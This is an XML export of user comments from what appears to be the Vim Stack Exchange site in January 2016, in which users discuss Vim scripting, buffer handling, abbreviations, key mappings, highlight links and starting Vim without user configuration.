  <row Id="9322" PostId="6035" Score="0" Text="@saginaw Thank you very much for the resources. I will check the links. There is not much of a script yet :) Just prototyping bit and pieces. This was part of a function that accepts strings only but internally needs to convert those to integers. `call MyFunc('1')` So I just wanted to make sure that anything like  `call MyFunc('foo')` will be caught." CreationDate="2016-01-03T19:42:14.527" UserId="5328" />
  <row Id="9323" PostId="6025" Score="1" Text="I wrote a plugin called [lister.vim](https://github.com/tommcdo/vim-lister) which could be of use here. Among other things, it provides a `:Qgrep` command that allows you to narrow down the quickfix list by a pattern." CreationDate="2016-01-03T22:14:59.903" UserId="64" />
  <row Id="9324" PostId="6035" Score="2" Text="How about converting the result back to string, and comparing with the original? :D" CreationDate="2016-01-04T11:31:35.350" UserId="1800" />
  <row Id="9325" PostId="6039" Score="0" Text="thanks for this. I think you have a typo - argodo? This works for the question -  as I phrased it so I guess I should accept but I dont know if it would help the community because I just realised deleting the entire arglist would be too indiscriminate. any files you were actually editing (as opposed to arglist operations)  would also be closed by this" CreationDate="2016-01-05T00:09:05.283" UserId="4603" />
  <row Id="9326" PostId="6039" Score="0" Text="In general I find &quot;cleaning up&quot; the buffer list for the sake of tidiness to be a bit silly. It doesn't really matter how many buffers you have open (as long as they are small). Using `:b` with a partial name or a fuzzy finder to switch between buffers often removes the need to view the buffer list via `:ls`. I often have 50+ buffers open at a time without concern. Of course, your workflow may have different needs." CreationDate="2016-01-05T00:16:59.863" UserId="778" />
  <row Id="9327" PostId="6039" Score="0" Text="wow, that makes sense. It would be liberating to stop maintaining the bufferlist! the main reason I have been doing it is because when I open a buffer by `:ls` , `:b #` I can control how the placement of  windows AND the files in them. my fuzzy finder  - ctrlp - and project explorer - nerdtree - dont use the buffer workflow. So i needed the bufferlist because it does. but they do provide the ability e.g. `ctrlp`, `ctrl-o`, `r` does open a buffer in the current window. and nerdtree does have a buffer explorer" CreationDate="2016-01-05T00:51:04.973" UserId="4603" />
  <row Id="9328" PostId="6039" Score="0" Text="Here is a piece of advice: don't mix a plugin-based workflow with a defaults-based workflow. Plugins tend to operate within the boundaries of their design and generally don't play very well with default commands." CreationDate="2016-01-05T08:34:21.450" UserId="54" />
  <row Id="9329" PostId="6035" Score="1" Text="I think `'[^0-9]'` is the correct answer to this -- it will match any string with any characters besides those. You should write that as an answer as well, @symbolix." CreationDate="2016-01-05T09:04:10.843" UserId="1672" />
  <row Id="9330" PostId="5926" Score="0" Text="*Why* do you want to change the existing auto-command? It's certainly not how I'd achieve the same functionality, but if it works, what is your goal in changing it? Why specifically do you want your solution to use `:execute`?" CreationDate="2016-01-05T10:11:25.977" UserId="343" />
  <row Id="9331" PostId="5676" Score="0" Text="I found a http://www.emacswiki.org/emacs/HideIfDef , which allows hiding unused code. Haven't tested it yet. Should be useful." CreationDate="2016-01-05T11:24:20.027" UserId="5365" />
  <row Id="9332" PostId="6040" Score="0" Text="Waitaminute, are you saying you use Bash in Emacs mode even though you use Vim as your editor?" CreationDate="2016-01-05T20:14:34.590" UserId="1060" />
  <row Id="9333" PostId="6040" Score="2" Text="@KyleStrand I've yet to see someone who used Bash in vi mode. It seems like most of the benefits of modal editors disappear when you're only limited to one line." CreationDate="2016-01-05T20:41:10.687" UserId="5899" />
  <row Id="9334" PostId="6040" Score="1" Text="Interesting. I only ever use Bash in Vi mode, though it does seem like Emacs mode supports some things that Vi mode doesn't. I just happen to know Vi keybindings while remaining almost completely ignorant of Emacs bindings, and I've never thought it a pressing enough issue to learn the defaults." CreationDate="2016-01-05T20:46:00.043" UserId="1060" />
  <row Id="9335" PostId="6045" Score="2" Text="I use `if (v:version == 704 &amp;&amp; has(&quot;patch393&quot;)) || v:version &gt; 704` with `set renderoptions` and seems to work pretty well." CreationDate="2016-01-06T20:55:26.497" UserId="1800" />
  <row Id="9336" PostId="6045" Score="1" Text="For the 1st issue, i used Google :D https://groups.google.com/forum/#!topic/vim_dev/uZbngIYTl5M" CreationDate="2016-01-06T20:57:53.707" UserId="1800" />
  <row Id="9337" PostId="6045" Score="1" Text="Thank you very much! So I just need to find out when `&lt;C-g&gt;U` was added..." CreationDate="2016-01-06T20:58:13.930" UserId="4939" />
  <row Id="9338" PostId="6045" Score="1" Text="Ah ok so it was in patch 849, thank you very much again. If you post it as an answer I'll accept it. Could you briefly explain how you found it on vim_dev ? I'm not used to this site." CreationDate="2016-01-06T21:00:01.193" UserId="4939" />
  <row Id="9339" PostId="6045" Score="1" Text="romainl's answer is ok - i just used quoted text from the relevant vim's help section to search on google." CreationDate="2016-01-06T21:02:14.247" UserId="1800" />
  <row Id="9340" PostId="6048" Score="2" Text="Are you sure about this: *if you add a character to iskeyword, then use it for isabbrev, and then remove it from iskeyword, the abbreviation still works.*? From my experience this does not work. Once you change your 'isk' setting you may disable abbreviations. Note also, since the 'isk' setting is used for may things, it is usually a bad idea to mess with it. It breaks in too many different places." CreationDate="2016-01-07T07:42:51.397" UserId="71" />
  <row Id="9341" PostId="6049" Score="0" Text="play with set autoindent or set noautoindent pre typing. Works for me in non `python` or `C` indenting" CreationDate="2016-01-07T08:05:58.827" UserId="1313" />
  <row Id="9342" PostId="6044" Score="0" Text="Seconded, this is how I write too. Many things in Markdown benefit from blank lines around them." CreationDate="2016-01-07T08:37:42.383" UserId="205" />
  <row Id="9343" PostId="2692" Score="0" Text="I've been digging through the documentation to get a better grasp on `ex` mode.  I don't get why you have a bang (`!`) in your `trim` alias `bufdo` command.  Won't that just abandon all changes in all files except the last one?  If not, why not?" CreationDate="2016-01-07T09:11:41.343" UserId="4676" />
  <row Id="9344" PostId="789" Score="2" Text="Note that at least some of these examples aren't POSIX-compliant, for instance, `bufdo`.  Even though Vim is what's installed virtually everywhere, it's worth knowing that you *can* script file editing using only [POSIX-compliant features of `ex`](http://pubs.opengroup.org/onlinepubs/9699919799/utilities/ex.html)." CreationDate="2016-01-07T09:19:44.487" UserId="4676" />
  <row Id="9345" PostId="2692" Score="0" Text="@Wildcard Without `!` basically won't work, as each time when buffer is switched, `ex` would complains about non-saved changes (and we're saving changes at the very end with `xa`). The warning can be disabled, but it's much easier to add `!`." CreationDate="2016-01-07T09:54:54.557" UserId="467" />
  <row Id="9346" PostId="2692" Score="0" Text="I see...I guess I'm misreading the documentation, then; it specifies that *without* the `!` the command will fail if the buffer can't be abandoned, but it doesn't explicitly specify that `!` will cause the buffer to *not* be discarded....  So, does &quot;abandoned&quot; in this case mean &quot;dropped, because it doesn't contain anything not written to disk&quot;?  Or what?  (I'm looking at `:help bufdo`)" CreationDate="2016-01-07T10:03:56.087" UserId="4676" />
  <row Id="9347" PostId="2692" Score="0" Text="On a related note, you would probably have something helpful to add to [the attempt I just made at writing a POSIX-compliant `ex` command](http://unix.stackexchange.com/a/253820/135943)...if you've got a minute.  :)" CreationDate="2016-01-07T10:06:10.683" UserId="4676" />
  <row Id="9349" PostId="2124" Score="0" Text="the qustion where about listing buffers in the quickfind window." CreationDate="2016-01-07T11:38:57.547" UserId="5934" />
  <row Id="9350" PostId="2124" Score="0" Text="Yes, and my answer provides a lightweight alternative." CreationDate="2016-01-07T13:15:21.347" UserId="54" />
  <row Id="9351" PostId="6044" Score="0" Text="After posting my question i've noticed this too, but @muru 's stackoverflow link more helpful in my &quot;general problem&quot;, so thanks I'll upvoted your post." CreationDate="2016-01-07T14:39:40.817" UserId="2354" />
  <row Id="9352" PostId="6049" Score="0" Text="@mMontu thanks for the link. It seems that this can be fixed using `formatexpr` but as a Vim newbie, I'm not sure _exactly_ what to do / what to add to my .vimrc. Any insight/advice would be greatly appreciated." CreationDate="2016-01-07T15:48:56.030" UserId="5932" />
  <row Id="9353" PostId="6049" Score="0" Text="The change isn't straightforward. Following that link you can see a similar &quot;duplicate&quot; comment on that question. And notice that none of those questions have accepted answers. Achieving what you described will require reading through those questions and the documentation on the referenced Vim options along a lot of trial and error. If you go through this effort please post your answer here, I'd like to have this in C :)" CreationDate="2016-01-07T16:41:35.363" UserId="1405" />
  <row Id="9354" PostId="6049" Score="0" Text="I've just remembered I once had a [similar need](http://stackoverflow.com/questions/7666182/format-line-with-code-and-comments-in-vim), but never had the chance to find a solution." CreationDate="2016-01-07T16:45:32.307" UserId="1405" />
  <row Id="9355" PostId="6053" Score="0" Text="POSIX doesn't allow several -c commands, also I believe the ex-vi project is dead" CreationDate="2016-01-07T17:53:01.647" UserId="71" />
  <row Id="9356" PostId="6054" Score="0" Text="Perl could be used as an alternative to avoid interactive mode: `$ perl -i -ne 'print unless /127/;' file` - it has the advantage of being installed on most systems by default." CreationDate="2016-01-07T18:02:50.097" UserId="1405" />
  <row Id="9357" PostId="6054" Score="0" Text="or use sed, which should be also available on each POSIX system" CreationDate="2016-01-07T20:07:41.980" UserId="71" />
  <row Id="9359" PostId="2124" Score="0" Text="OP states he knows about the bufferlist but like to have it in the quickfix window. and you're solution is just to use the bufferlist?" CreationDate="2016-01-07T20:21:33.210" UserId="5934" />
  <row Id="9369" PostId="5926" Score="0" Text="@Rich - How would you achieve the same? About Eval strings - to improve maintainability and extensibility." CreationDate="2016-01-08T08:10:49.350" UserId="5768" />
  <row Id="9372" PostId="6061" Score="2" Text="I am not sure **why** it was made like it. You would have to ask Bill Joy about it. Chances are however, this a logical bug, that just has never been fixed in the original vi and then made it into all the clones and eventually has therefore been demanded by POSIX." CreationDate="2016-01-08T09:27:56.023" UserId="71" />
  <row Id="9373" PostId="6048" Score="0" Text="I double checked. It works! Editing the question." CreationDate="2016-01-08T09:36:33.197" UserId="5919" />
  <row Id="9375" PostId="6061" Score="2" Text="If you ever find the answer they also need it [here](http://stackoverflow.com/questions/3517057/why-does-y-do-the-same-thing-as-yy). ;)" CreationDate="2016-01-08T09:51:10.667" UserId="630" />
  <row Id="9376" PostId="5926" Score="0" Text="@work.bin I'll add an answer describing how I'd do it (which I think meets your goals)." CreationDate="2016-01-08T09:52:44.050" UserId="343" />
  <row Id="9378" PostId="6048" Score="0" Text="For me, `iabbrev 'a foo` and `iabbrev &quot;a foo` work without having to mess with `iskeyword`." CreationDate="2016-01-08T10:38:54.723" UserId="205" />
  <row Id="9379" PostId="2061" Score="0" Text="Most, though not all (specifically functions and plugins), of these are listed in `:help help-context`: Maybe that is worth mentioning in the answer as well." CreationDate="2016-01-08T10:57:01.383" UserId="1672" />
  <row Id="9380" PostId="6057" Score="0" Text="I see a box opening, yet I am unsure how to navigate within it. Ctrl+N and Ctrl+P move up and down, yet I do not understand your &quot;it isn't recursive part&quot;. Could you please elaborate on how I can complete a nested file name multiple level down?" CreationDate="2016-01-08T11:00:11.493" UserId="5449" />
  <row Id="9381" PostId="2061" Score="0" Text="@SakariCajanus Yes! `help-context` is actually almost the first thing on the front page of Vim's `:help`. I've added a footnote mentioning this to the answer." CreationDate="2016-01-08T12:01:43.720" UserId="343" />
  <row Id="9382" PostId="6067" Score="0" Text="Do I have to put the vertical bar `|` right after the abbreviation?" CreationDate="2016-01-08T12:27:11.127" UserId="5919" />
  <row Id="9383" PostId="6067" Score="0" Text="Yes. Try copying the last line of the answer into your Vim command line." CreationDate="2016-01-08T12:35:09.743" UserId="1405" />
  <row Id="9384" PostId="6064" Score="0" Text="Thanks. Exactly what I wanted. didn't get this on my google search, dunno why." CreationDate="2016-01-08T12:47:50.740" UserId="5019" />
  <row Id="9386" PostId="6057" Score="0" Text="To select items from the list, use the Ctrl+N and Ctrl+P keys, and keep typing to finish the completion.  What I mean by it being non recursive is that you have to complete the path each item at a time, like you would with tab completion in a bash shell." CreationDate="2016-01-08T14:22:03.733" UserId="865" />
  <row Id="9387" PostId="6061" Score="1" Text="I doubt this is the actual reason, but [the person who objected to Y being remapped in vim-sensible](https://github.com/tpope/vim-sensible/issues/47) argued that, as a C programmer, they used to-end-of-line yanking far more than entire-line yanking, and therefore the default mappings are good. YMMV: mine certainly does." CreationDate="2016-01-08T16:20:14.887" UserId="343" />
  <row Id="9388" PostId="6070" Score="0" Text="What do you mean by makeing the key persistent? Isn't it persistent, once you put this in your .vimrc?" CreationDate="2016-01-08T18:55:54.760" UserId="71" />
  <row Id="9389" PostId="6070" Score="0" Text="Sorry, I mean last longer. For example, in my case if I start type in normal mode &quot;&lt;leader&gt;...&quot; , the command only last for 2 seconds. What I want is Vim wait for the entire command or until I press ESC." CreationDate="2016-01-08T19:03:29.490" UserId="2131" />
  <row Id="9390" PostId="6070" Score="0" Text="You mean the timeout? Does `:h 'timout'` help you?" CreationDate="2016-01-08T19:05:32.600" UserId="71" />
  <row Id="9391" PostId="6073" Score="1" Text="Thank your for your answer. Just another question, if I type: `inoremap &lt;expr&gt; &lt;F3&gt; &quot;&lt;C-r&gt;a&quot;`, it works as expected. I don't have to escape `&lt;C-r&gt;`, why?" CreationDate="2016-01-08T19:06:04.643" UserId="4939" />
  <row Id="9392" PostId="6073" Score="1" Text="That is interesting and certainly unexpected. That might be a bug." CreationDate="2016-01-08T19:08:40.963" UserId="71" />
  <row Id="9393" PostId="6070" Score="0" Text="Not much, since I can't found anything about key specific timeout. (I want just the leader key to wait the command)" CreationDate="2016-01-08T19:11:50.820" UserId="2131" />
  <row Id="9394" PostId="6073" Score="1" Text="I may be wrong, but I don't think it's a bug. If you look at the very bottom of `:h ins-special-special`, they give these 2 examples : `inoremap &lt;expr&gt; &lt;Home&gt; col('.') == match(getline('.'), '\S') + 1 ?&#xA;	 \ repeat('&lt;C-G&gt;U&lt;Left&gt;', col('.') - 1) :&#xA;	 \ (col('.') &lt; match(getline('.'), '\S') ?&#xA;	 \     repeat('&lt;C-G&gt;U&lt;Right&gt;', match(getline('.'), '\S') + 0) :&#xA;	 \     repeat('&lt;C-G&gt;U&lt;Left&gt;', col('.') - 1 - match(getline('.'), '\S')))&#xA;	inoremap &lt;expr&gt; &lt;End&gt; repeat('&lt;C-G&gt;U&lt;Right&gt;', col('$') - col('.'))`. They don't escape `&lt;C-G&gt;`, neither `&lt;Left&gt;` nor `&lt;Right&gt;`." CreationDate="2016-01-08T19:45:05.827" UserId="4939" />
  <row Id="9395" PostId="6073" Score="1" Text="Worse, they don't use double quotes, but single quotes (which prevents Vim from evaluating anything in the string).&#xA;My theory: they don't need to be escaped because the Ex commands which define mappings such as `:inoremap` don't need it,&#xA;they already know that `&lt;CR&gt;` for example means &quot;carriage return&quot;, you don't need to write `\&lt;cr&gt;` in a mapping.&#xA;This is why I don't understand why I need to escape `&lt;C-r&gt;` when it comes from a function but not when it's on the command line.&#xA;But I like your answer, from now on, I will always use double quotes and escape to represent a control character." CreationDate="2016-01-08T19:45:48.127" UserId="4939" />
  <row Id="9396" PostId="6036" Score="0" Text="Actually, letting a window-local option is not a good idea. Use a buffer-local one instead." CreationDate="2016-01-08T20:26:08.153" UserId="54" />
  <row Id="9397" PostId="6036" Score="0" Text="Ok I will change the code, but why a window-local variable is not a good idea? In which scenario would it cause some issue?" CreationDate="2016-01-08T21:02:59.980" UserId="4939" />
  <row Id="9398" PostId="6074" Score="1" Text="If my Vim version has `:keepjumps`, could I remove `mark '`, and if I have `:keeppatterns` could I remove `let save = @/` and `call histdel('/', -1) let @/ = save` and replace `silent! execute a:motion` with something like         `silent! execute 'keepjumps keeppatterns ' . a:motion`?" CreationDate="2016-01-08T21:38:13.477" UserId="4939" />
  <row Id="9399" PostId="6073" Score="1" Text="i know the example very well. I am still not sure, whether this is a bug. I'll ask vim-dev" CreationDate="2016-01-08T21:40:37.250" UserId="71" />
  <row Id="9400" PostId="6077" Score="2" Text="I think the OP wants to set the timeout options for specific keys.  _(such as making only the leader key not time out)_" CreationDate="2016-01-08T21:42:47.103" UserId="865" />
  <row Id="9401" PostId="6036" Score="1" Text="Basically, I had `b:winview` in my original command and elsewhere but, when I yanked it for my answer, I thought that using a buffer variable for a window-related feature sounded dumb and replaced it everywhere with `w:winview` in my config. I quickly started to notice a weird behavior: switching to another buffer in the same window always landed me in strange places. I figured out why this afternoon: `winsaveview()` saved the window's state to a window variable so each buffer would share the same state. Using `b:winview` solves that." CreationDate="2016-01-08T22:23:55.797" UserId="54" />
  <row Id="9402" PostId="6074" Score="1" Text="Maybe, but you would trade portability for virtually no benefit." CreationDate="2016-01-08T22:28:50.063" UserId="54" />
  <row Id="9403" PostId="2692" Score="0" Text="I think this should be the accepted answer.  It actually *answers* the title question." CreationDate="2016-01-08T22:49:51.847" UserId="4676" />
  <row Id="9404" PostId="6064" Score="2" Text="@MohitC I map `/` to `/\v` to enable &quot;very magic&quot; for most searches, so I have mapped `//` to `/` to start an unmodified search (useful for going through search history ignoring modifiers) and `/v/` to `/\V` to quickly turn off all magic for searching." CreationDate="2016-01-08T22:56:38.930" UserId="1060" />
  <row Id="9405" PostId="6064" Score="0" Text="@MohitC In fact, my setup is more complicated than that, because I also use a plugin to use &quot;very magic&quot; as consistently as possible in all contexts. See [my answer here](http://stackoverflow.com/a/23021259/1858225)." CreationDate="2016-01-08T22:58:11.787" UserId="1060" />
  <row Id="9406" PostId="6080" Score="0" Text="I realise that i should explain why. However, i did not have the time to find out. I will update if and when i find out :-)" CreationDate="2016-01-08T23:07:19.047" UserId="21" />
  <row Id="9407" PostId="6074" Score="0" Text="I completely misunderstood the purpose of `mark '`, I thought it was to prevent the jumplist to be modified. But in fact, I think it's the opposite, it's for adding an entry in the jumplist so that you can come back to where you were with `''` or ``, sorry. Anyway this is some great code! With this, you can define with autocommands different type of sections for different filetypes." CreationDate="2016-01-08T23:53:50.910" UserId="4939" />
  <row Id="9409" PostId="6080" Score="0" Text="This asymmetry between insert and append does seem really quirky. If there's a reason I should expect this that would be useful to know. Thanks!" CreationDate="2016-01-09T02:41:26.600" UserId="268" />
  <row Id="9411" PostId="6028" Score="0" Text="Thanks for the confirmation. But I am concerned if I put `highlight link ...` commands in a syntax file that these will overwrite settings from the colorscheme each time a file with that filetype is loaded. Should I perhaps *only* do `highlight link ...` after checking that no highlight rule exists for that name?" CreationDate="2016-01-09T05:53:23.733" UserId="630" />
  <row Id="9412" PostId="6028" Score="0" Text="Ah, I need not worry. Vim docs say: If there are already highlight settings for the {from-group}, the link is not made, unless the '!' is given. For a &quot;:highlight link&quot; command in a sourced file, you don't get an error message. This can be used to skip links for groups that already have settings." CreationDate="2016-01-09T06:18:40.383" UserId="630" />
  <row Id="9413" PostId="6028" Score="0" Text="But for people tweaking their colorschemes, a `highlight link` in the colorscheme could be overwritten later by a `highlight link` in a syntax file. To avoid this, actual arguments (ctermbg, guifg, ...) can be used instead of a link." CreationDate="2016-01-09T06:23:35.797" UserId="630" />
  <row Id="9414" PostId="6028" Score="0" Text="The user should have the last word on what colors are used for a given highlight group. To that effect, it is not uncommon to see language-specific highlight definitions in colorschemes. You should only use `highlight link ...` in your syntax script and let your users override it if they want." CreationDate="2016-01-09T09:51:59.433" UserId="54" />
  <row Id="9415" PostId="6080" Score="0" Text="That's how it is. See `:h blockwise-operators` (`v_b_I`, `v_b_A` follows)." CreationDate="2016-01-09T15:32:06.920" UserId="1800" />
  <row Id="9416" PostId="6073" Score="1" Text="[I did](https://groups.google.com/d/msg/vim_dev/aRYJI5WWYFY/oEhvWUPaAwAJ) this is, because the map commands parse those keys directly." CreationDate="2016-01-09T16:04:35.697" UserId="71" />
  <row Id="9417" PostId="6080" Score="0" Text="The reason for that is explained in the [help](https://github.com/vim/vim/blob/master/runtime/doc/visual.txt#L331-L333)" CreationDate="2016-01-09T16:08:31.783" UserId="71" />
  <row Id="9418" PostId="6073" Score="0" Text="Thank you! I think you're right, this should be documented because I've been confused by what happened for a long time." CreationDate="2016-01-09T16:30:57.420" UserId="4939" />
  <row Id="9419" PostId="6086" Score="0" Text="From stackoverflow: http://stackoverflow.com/q/782511/4751065" CreationDate="2016-01-10T11:44:44.333" UserId="1672" />
  <row Id="9420" PostId="6086" Score="0" Text="@SakariCajanus Thank you. I see that without a plugin it is quite cumbersome. Guess I have to find out how to use plugins in ViEmu." CreationDate="2016-01-10T11:47:09.847" UserId="5011" />
  <row Id="9421" PostId="6080" Score="0" Text="Thanks! I've updated the answer." CreationDate="2016-01-10T15:02:44.783" UserId="21" />
  <row Id="9422" PostId="6090" Score="0" Text="My favorite plugin manager is pathogen.&#xA;https://github.com/tpope/vim-pathogen" CreationDate="2016-01-10T18:56:29.827" UserId="5919" />
  <row Id="9423" PostId="6090" Score="0" Text="https://github.com/lervag/vimtex#installation" CreationDate="2016-01-10T19:00:29.990" UserId="54" />
  <row Id="9424" PostId="6087" Score="0" Text="And a `/g` at the end ;). Note that &quot;Begin of the beginning&quot; turns into &quot;End of the endning&quot;, but that was my mistake. Thank you. :)" CreationDate="2016-01-10T19:54:23.983" UserId="5011" />
  <row Id="9425" PostId="6085" Score="0" Text="thank you that worked wonderfully!" CreationDate="2016-01-10T20:50:08.773" UserId="5964" />
  <row Id="9426" PostId="6093" Score="0" Text="wait a related question, I've got `guioptions=ac`, the `a` is suspect. http://vi.stackexchange.com/questions/769/can-visual-select-mode-be-integrated-with-the-unix-selection-clipboard?rq=1" CreationDate="2016-01-11T05:13:08.570" UserId="488" />
  <row Id="9427" PostId="6028" Score="0" Text="My concern was that if users use `highlight link ...` in their colorscheme, then the syntax file might reset it later with its own `highlight link ...`. I see now that good syntax files avoid this by using **`highlight default link ...`**. That should probably be a correction to the `asmHexNumber` rule in my question." CreationDate="2016-01-11T05:19:14.053" UserId="630" />
  <row Id="9428" PostId="6086" Score="0" Text="I understand it's just an example, but sometimes you might just want to do 2 substitutions instead of one." CreationDate="2016-01-11T07:22:05.077" UserId="1296" />
  <row Id="9429" PostId="6090" Score="0" Text="https://github.com/junegunn/vim-plug#installation" CreationDate="2016-01-11T11:02:11.580" UserId="599" />
  <row Id="9430" PostId="6043" Score="0" Text="Hey, first of all - thanks. As your answer solves my question not perfectly, I'll wait another few weeks for alternative answers, until I'll mark your answer as accepted." CreationDate="2016-01-11T21:05:17.937" UserId="2354" />
  <row Id="9431" PostId="6097" Score="0" Text="Also: http://www.kaoriya.net/software/vim/ (just make sure to remove `vimrc` and `gvimrc` included in the same folder with the executable)." CreationDate="2016-01-11T21:24:49.417" UserId="1800" />
  <row Id="9432" PostId="6100" Score="0" Text="does setting the statuslinecolor not work?" CreationDate="2016-01-12T17:02:57.290" UserId="71" />
  <row Id="9433" PostId="6004" Score="0" Text="I don't quite understand what the question is here..." CreationDate="2016-01-12T17:35:04.650" UserId="21" />
  <row Id="9434" PostId="6004" Score="0" Text="@KarlYngveLervåg, you are right. Explained better now, I hope." CreationDate="2016-01-12T18:17:39.790" UserId="854" />
  <row Id="9435" PostId="6101" Score="2" Text="There exists a [plugin](https://github.com/kana/vim-textobj-line)" CreationDate="2016-01-12T19:28:37.240" UserId="71" />
  <row Id="9436" PostId="6104" Score="0" Text="Interesting; I'd never noticed that before! Still, I would prefer it expand in other cases too if possible as I habitually type a few characters before hitting the expansion keys." CreationDate="2016-01-12T20:50:25.703" UserId="1402" />
  <row Id="9437" PostId="6104" Score="1" Text="Vimple (https://github.com/dahu/vimple) has a filename completion option that honours 'path' setting, which has this side effect. It needs quite recent vim and doesn't work quite the same as vim's default, think of it more as an example." CreationDate="2016-01-12T21:34:25.957" UserId="1672" />
  <row Id="9438" PostId="6103" Score="2" Text="If you write it like this ~user/foo/bar, the tilde will be correctly expanded" CreationDate="2016-01-12T21:51:49.890" UserId="71" />
  <row Id="9439" PostId="6105" Score="3" Text="You might want to join the discussion [here](https://groups.google.com/d/msg/vim_dev/dAXpcpHmVw4/PtJIrRMACQAJ)" CreationDate="2016-01-13T07:29:41.930" UserId="71" />
  <row Id="9440" PostId="6105" Score="0" Text="More importantly, *why* would you want to install new patches and introduce new random bugs every couple of days?" CreationDate="2016-01-13T08:26:51.817" UserId="54" />
  <row Id="9441" PostId="6105" Score="1" Text="@romainl It doesn't have to be every couple of days - a download every month, maybe fortnight. The important bit is that I shouldn't have to go looking for updates manually - it should be served up to me on a platter, if you will. :D I'll live with the odd bug or so being introduced every month (I use Arch Linux as my main Linux distribution). Who knows, maybe I will report a few and get to see them fixed, or fix them myself." CreationDate="2016-01-13T08:34:45.767" UserId="205" />
  <row Id="9442" PostId="6105" Score="0" Text="@ChristianBrabandt that was interesting (if rather long). So, to summarise: a builtin function would appear some time, but it will be blocking. That can perhaps be avoided using whatever https://github.com/tpope/vim-dispatch does." CreationDate="2016-01-13T08:35:09.333" UserId="205" />
  <row Id="9443" PostId="6109" Score="0" Text="I've installed the plugin and I like it a lot thank you! It doesn't need Python that's a great advantage compared to other ones. However I still don't understand why sometimes `g+` seems to skip a leaf. I'm just curious to know if it's a small bug or if I have completely misunderstood how the undo tree works." CreationDate="2016-01-13T10:51:38.247" UserId="4939" />
  <row Id="9445" PostId="6109" Score="0" Text="@saginaw I'm glad that you liked it! And I understand your curiosity :)  Maybe including an image (or an animated gif) generated by the plugin make it easier for others to understand your question" CreationDate="2016-01-13T12:30:14.550" UserId="1405" />
  <row Id="9446" PostId="6043" Score="0" Text="What is it missing? Your question description was rather vague." CreationDate="2016-01-13T12:44:00.450" UserId="4932" />
  <row Id="9447" PostId="6105" Score="0" Text="Keeping the runtime files updates is easy; just us `git` and schedule a `git pull` every *n* days. On Windows you can use `mklink` to symlink `C:/Program Files/vim/...` to the git repo." CreationDate="2016-01-13T13:42:37.290" UserId="51" />
  <row Id="9448" PostId="6099" Score="1" Text="You should be able to press `&lt;C-l&gt;` to force a screen update. Other than that, this is either something in a plugin, or a bug... Try disabling all plugins." CreationDate="2016-01-13T13:46:29.927" UserId="51" />
  <row Id="9449" PostId="2141" Score="0" Text="The link is (currently) broken." CreationDate="2016-01-13T15:20:53.917" UserId="343" />
  <row Id="9450" PostId="6112" Score="0" Text="On a Unix-like system, what if you do: `HOME=/dev/null vim -u NONE`?" CreationDate="2016-01-13T16:17:45.080" UserId="205" />
  <row Id="9451" PostId="6112" Score="0" Text="@muru Nice idea, and probably worth adding as an answer, but it's not *perfect*. You obviously lose the ability to e.g. `:cd ~`, but also the default location of the `viminfo` file is in $HOME, which can cause E138. I guess creating a new, empty directory and using that for $HOME might be the best solution." CreationDate="2016-01-13T16:52:32.457" UserId="343" />
  <row Id="9452" PostId="6112" Score="0" Text="@muru Just occurred to me that if you're setting $HOME, then presumably you don't also need to specify `-u NONE`?" CreationDate="2016-01-13T16:55:43.867" UserId="343" />
  <row Id="9453" PostId="6112" Score="1" Text="in which case `/tmp` might be better, it was my first thought, but then I chose /dev/null as a black hole. ... Or something like `HOME=$(mktemp -d) vim ...`." CreationDate="2016-01-13T16:56:10.943" UserId="205" />
  <row Id="9454" PostId="6112" Score="0" Text="Won't it read system vimrc if you don't use `-u NONE`? Depends on what behaviour you need, I suppose." CreationDate="2016-01-13T16:57:30.657" UserId="205" />
  <row Id="9455" PostId="6112" Score="0" Text="@muru I thought I wanted it to read anything that came with the installation, but nothing that has been added afterwards, but on reflection maybe I do just want `-u NONE`. Thanks for the suggestions! (And again, you should probably add them as an answer.)" CreationDate="2016-01-13T17:01:12.167" UserId="343" />
  <row Id="9456" PostId="6114" Score="2" Text="vim -i NONE to prevent loading viminfo" CreationDate="2016-01-13T17:53:09.897" UserId="71" />
  <row Id="9457" PostId="6112" Score="0" Text="What are you trying to do? [(XY Problem)](http://meta.stackexchange.com/a/66378/188334)" CreationDate="2016-01-13T17:55:01.850" UserId="1405" />
  <row Id="9458" PostId="6117" Score="1" Text="Despite being in the FAQ, this doesn't actually work, for the reasons mentioned in the question." CreationDate="2016-01-13T17:57:40.747" UserId="343" />
  <row Id="9459" PostId="6112" Score="0" Text="@mMontu ensure that none of the behaviour I'm seeing is caused by user config." CreationDate="2016-01-13T17:58:35.393" UserId="343" />
  <row Id="9460" PostId="6117" Score="0" Text="@Rich From your comment on the question: `ensure that none of the behaviour I'm seeing is caused by user config` -- then it looks like you are trying to do *exactly* what is being explained in this FAQ. I've re-read your question and still don't understand what are the reasons you mentioned." CreationDate="2016-01-13T18:00:47.123" UserId="1405" />
  <row Id="9461" PostId="6117" Score="0" Text="I am indeed trying to do exactly what is being explained in the FAQ. But the solution it gives doesn't work, because of the `runtimepath` setting." CreationDate="2016-01-13T18:06:07.340" UserId="343" />
  <row Id="9463" PostId="6117" Score="0" Text="What exactly is wrong about the `runtimepath`? It seems like the default for this option, as explained in `:help rtp`. How is this value affecting your test?" CreationDate="2016-01-13T18:41:23.750" UserId="1405" />
  <row Id="9464" PostId="6099" Score="0" Text="The screen updates normally after any keypress; it's not that it gets stuck. But this brief period before next keypress just doesn't look pretty.&#xA;&#xA;And I didn't mess with any of the plugins, nor have I installed any new the day this started; I'll try, but I don't think the problem is in there." CreationDate="2016-01-13T18:51:50.663" UserId="5965" />
  <row Id="9465" PostId="6117" Score="0" Text="@Rich I mean, do you see any differences when comparing to a fresh install after you turn on filetype detection?" CreationDate="2016-01-13T19:01:16.063" UserId="1405" />
  <row Id="9466" PostId="6117" Score="0" Text="@Rich, this is the documented way to start Vim like in a fresh install. Also the 'rtp' setting is like this in a fresh install. Perhaps you are looking for the '--no-plugins' switch or 'loadplugins' setting" CreationDate="2016-01-13T20:53:40.167" UserId="71" />
  <row Id="9467" PostId="6117" Score="0" Text="@ChristianBrabandt The `rtp` setting isn't incorrect. But it points to user configuration files. The documentation is incorrect to state that starting the Vim in this way causes it to work like a fresh install, as I (attempted, but obviously failed to) explain in the original question." CreationDate="2016-01-13T21:30:36.497" UserId="343" />
  <row Id="9468" PostId="6117" Score="0" Text="@ChristianBrabandt I might be reading the documentation incorrectly, but I think --noplugin affects code in `plugin` but not code in `after`. I'll test and get back to you if I'm wrong." CreationDate="2016-01-13T21:32:19.190" UserId="343" />
  <row Id="9469" PostId="6117" Score="0" Text="I've updated the question. Hopefully that clarifies the problem!" CreationDate="2016-01-13T21:50:39.513" UserId="343" />
